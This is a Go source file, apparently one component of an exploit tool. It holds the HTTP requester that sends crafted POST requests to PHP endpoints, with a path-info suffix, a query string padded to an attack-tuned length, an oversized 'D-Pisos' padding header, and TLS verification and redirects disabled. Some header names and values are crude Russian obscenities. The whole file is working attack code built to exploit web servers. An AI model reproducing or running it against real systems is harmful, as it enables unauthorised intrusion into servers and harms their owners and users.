package main

import (
	"bytes"
	"crypto/tls"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"strings"
	"time"
)

type Requester struct {
	cl     *http.Client
	u      *url.URL
	cookie string
}

type HeaderType int

const (
	HdrEbutMamku HeaderType = iota
	HdrIOnaNeProtiv
)

func NewRequester(resource, cookie string) (*Requester, error) {
	u, err := url.Parse(resource)
	if err != nil {
		return nil, fmt.Errorf("url.Parse failed: %v", err)
	}
	if !strings.HasSuffix(u.Path, ".php") {
		return nil, fmt.Errorf("well I believe the url must end with \".php\". " +
			"Maybe I'm wrong, delete this check if you feel like it")
	}

	nextProto := make(map[string]func(authority string, c *tls.Conn) http.RoundTripper)
	disableRedirects := func(_ *http.Request, _ []*http.Request) error { return http.ErrUseLastResponse }
	return &Requester{
		cl: &http.Client{
			Transport: &http.Transport{
				DisableCompression: true,      // No "Accept-Encoding"
				TLSNextProto:       nextProto, // No http2
				Proxy:              http.ProxyFromEnvironment,
				TLSClientConfig:    &tls.Config{InsecureSkipVerify: true},
			},
			Timeout:       30 * time.Second,
			CheckRedirect: disableRedirects, // No redirects
		},
		u:      u,
		cookie: cookie,
	}, nil
}

func (r *Requester) Request(pathInfo string, params *AttackParams) (*http.Response, []byte, error) {
	return r.RequestEx(pathInfo, params, "", HdrEbutMamku)
}

func (r *Requester) RequestEx(pathInfo string, params *AttackParams, prefix string, header HeaderType) (*http.Response, []byte, error) {
	if !strings.HasPrefix(pathInfo, "/") {
		return nil, nil, fmt.Errorf("path doesn't start with slash: %#v", pathInfo)
	}
	u := *r.u
	u.Path = u.Path + pathInfo
	qslDelta := len(u.EscapedPath()) - len(pathInfo) - len(r.u.EscapedPath())
	if qslDelta%2 != 0 {
		panic(fmt.Errorf("got odd qslDelta, that means the URL encoding gone wrong: pathInfo=%#v, qslDelta=%#v", qslDelta))
	}
	qslPrime := params.QueryStringLength - qslDelta/2 - len(prefix)
	if qslPrime < 0 {
		return nil, nil, fmt.Errorf("qsl value too small: qsl=%v, qslDelta=%v, prefix=%#v", params.QueryStringLength, qslDelta, prefix)
	}
	u.RawQuery = prefix + strings.Repeat("Q", qslPrime)
	body := bytes.NewBuffer([]byte("el=da"))
	req, err := http.NewRequest("POST", u.String(), body)
	if err != nil {
		return nil, nil, err
	}
	req.Header.Set("User-Agent", UserAgent)
	if r.cookie != "" {
		req.Header.Set("Cookie", r.cookie)
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("D-Pisos", "8"+strings.Repeat("=", params.PisosLength)+"D")
	switch header {
	case HdrEbutMamku:
		req.Header.Set("Ebut", "mamku tvoyu")
	case HdrIOnaNeProtiv:
		req.Header.Set("I-Ona-Protiv", "net")
	}

	resp, err := r.cl.Do(req)
	if resp != nil {
		defer func() { _ = resp.Body.Close() }()
	}
	if err != nil {
		return nil, nil, err
	}
	data, err := ioutil.ReadAll(resp.Body)
	return resp, data, err
}
